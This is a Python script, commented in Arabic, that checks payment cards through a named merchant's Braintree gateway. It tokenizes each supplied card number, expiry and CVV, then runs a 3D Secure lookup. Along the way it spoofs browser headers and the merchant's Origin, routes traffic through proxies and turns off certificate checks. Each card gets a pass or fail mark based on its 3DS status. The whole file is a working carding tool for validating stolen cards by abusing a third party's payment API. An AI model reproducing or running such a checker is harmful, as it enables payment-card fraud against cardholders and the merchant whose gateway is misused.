"""
بوابة الدفع: Braintree 3DS Secure LookUp 2
الموقع: metatagmanager.com
نوع البوابة: Braintree 3DS Secure LookUp
تدفق الطلبات:
1. POST https://api.braintreegateway.com/merchants/6hf8wrmn2ztbkpr7/client_api/v1/payment_methods/credit_cards -> الحصول على nonce
2. POST https://api.braintreegateway.com/merchants/6hf8wrmn2ztbkpr7/client_api/v1/payment_methods/{nonce}/three_d_secure/lookup -> التحقق من حالة 3DS
"""
import aiohttp
import asyncio
import uuid
import ssl

MERCHANT_ID = "6hf8wrmn2ztbkpr7"
MERCHANT_SITE = "metatagmanager.com"
# ملاحظة: يجب استبدال هذا التوكن بالقيمة الفعلية المستخرجة من الموقع
AUTH_TOKEN = "production_6hf8wrmn2ztbkpr7_placeholder"


async def req1_tokenize_card(
    session: aiohttp.ClientSession,
    cc: str,
    mm: str,
    yy: str,
    cvv: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 1: تحويل بيانات البطاقة إلى Braintree nonce."""
    headers = {
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Origin": f"https://{MERCHANT_SITE}",
        "Referer": f"https://{MERCHANT_SITE}/",
    }
    data = {
        "creditCard": {
            "number": cc,
            "expirationMonth": mm,
            "expirationYear": yy,
            "cvv": cvv,
            "options": {"validate": False},
        },
        "authorization": AUTH_TOKEN,
        "sessionId": str(uuid.uuid4()),
    }
    try:
        async with session.post(
            f"https://api.braintreegateway.com/merchants/{MERCHANT_ID}/client_api/v1/payment_methods/credit_cards",
            json=data,
            headers=headers,
            proxy=proxy_url,
        ) as r:
            res = await r.json(content_type=None)

        credit_cards = res.get("creditCards", [])
        if not credit_cards:
            error_msg = res.get("error", {}).get("message", "Tokenization Failed")
            raise RuntimeError(f"Tokenization Error: {error_msg}")

        nonce = credit_cards[0].get("nonce", "")
        if not nonce:
            raise RuntimeError("Nonce Not Found")
        return nonce
    except RuntimeError:
        raise
    except Exception as e:
        raise RuntimeError(f"req1_tokenize_card failed: {e}") from e


async def req2_3ds_lookup(
    session: aiohttp.ClientSession,
    nonce: str,
    proxy_url: str = None,
) -> dict:
    """الخطوة 2: إجراء 3DS LookUp للحصول على حالة المصادقة."""
    headers = {
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Origin": f"https://{MERCHANT_SITE}",
        "Referer": f"https://{MERCHANT_SITE}/",
    }
    data = {
        "amount": "10.00",
        "additionalInfo": {"acsWindowSize": "03"},
        "dfReferenceId": str(uuid.uuid4()),
        "authorization": AUTH_TOKEN,
        "sessionId": str(uuid.uuid4()),
    }
    try:
        async with session.post(
            f"https://api.braintreegateway.com/merchants/{MERCHANT_ID}/client_api/v1/payment_methods/{nonce}/three_d_secure/lookup",
            json=data,
            headers=headers,
            proxy=proxy_url,
        ) as r:
            return await r.json(content_type=None)
    except Exception as e:
        raise RuntimeError(f"req2_3ds_lookup failed: {e}") from e


async def process_B3_LookUp2_secure(
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الدالة الرئيسية لفحص البطاقة عبر بوابة Braintree 3DS Secure LookUp 2."""
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_ctx)
    timeout = aiohttp.ClientTimeout(total=20)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            nonce = await req1_tokenize_card(session, cc, mes, ano, cvv, proxy_url)
            res = await req2_3ds_lookup(session, nonce, proxy_url)

    except RuntimeError as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", str(e)
    except Exception as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", f"Error: {e}"

    lookup = res.get("lookup", {})
    status = lookup.get("status", "")

    if status == "enrolled":
        return f"✅ | {cc}|{mes}|{ano}|{cvv}", "3DS Enrolled (Challenge Required)"
    elif status == "not_enrolled":
        return f"✅ | {cc}|{mes}|{ano}|{cvv}", "3DS Not Enrolled (Passed)"
    elif status == "bypass":
        return f"✅ | {cc}|{mes}|{ano}|{cvv}", "3DS Bypassed"
    elif status == "lookup_error":
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", "3DS LookUp Error"
    else:
        error = res.get("error", {})
        msg = error.get("message", "Unknown Status") if error else "Unknown Status"
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", f"Status: {status or msg}"
